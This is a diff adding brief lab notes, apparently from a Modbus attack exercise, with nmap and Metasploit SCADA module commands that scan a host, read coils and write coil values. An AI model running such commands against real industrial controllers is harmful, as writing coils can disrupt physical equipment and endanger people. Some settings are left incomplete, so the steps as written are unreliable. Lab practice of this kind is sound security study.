@@ -1,0 +1,25 @@
+http://cyberforensic.net/labs/modbus-attack.html
+
+nmap -v --top-ports 10000 10.20.2.130
+
+metasploit
+use auxiliary/scanner/scada/modbus_scanner
+set rhost 10.20.2.130
+run
+show stationID
+
+use scanner/scada/modbusclient
+
+set data_address 0
+set rhost 10.20.2.130
+set unit_number 1
+set number
+set actions READ_COILS
+run
+
+set data_address 0
+set rhost 10.20.2.130
+set unit_number 1
+set number
+set data_coils 10101010101
+run
